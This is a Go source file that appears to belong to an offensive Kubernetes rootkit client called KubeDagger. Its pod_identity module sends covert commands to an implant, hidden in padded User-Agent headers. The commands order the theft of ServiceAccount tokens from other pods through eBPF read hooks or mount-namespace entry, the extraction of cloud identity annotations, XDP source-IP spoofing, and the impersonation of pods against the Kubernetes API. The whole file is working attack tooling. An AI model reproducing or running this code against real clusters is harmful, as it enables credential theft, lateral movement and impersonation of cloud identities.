package pod_identity

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type StealResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, targetPod, namespace, action, output string) error {
	result := &StealResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "impersonate":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_token", "read projected SA token from target pod /var/run/secrets/ via eBPF vfs_read hook", "podid_steal_token"},
			{"identify_ip", "determine target pod IP from CNI state or /proc/net/fib_trie", "podid_identify_ip"},
			{"spoof_source", "configure XDP program to rewrite source IP to match target pod", "podid_spoof_ip"},
			{"impersonate_api", "make API calls using stolen token from spoofed source IP", "podid_impersonate"},
		}
	default: // steal
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_pod", "identify target pod cgroup and namespace via /proc scanning", "podid_locate"},
			{"enter_mount_ns", "access target pod mount namespace to read projected volumes", "podid_enter_ns"},
			{"steal_token", "extract projected ServiceAccount token from volume mount", "podid_steal_token"},
			{"extract_annotations", "read pod annotations for cloud identity (IRSA/Workload Identity)", "podid_annotations"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + action + "#" + targetPod + "#" + namespace
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/pod_identity", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
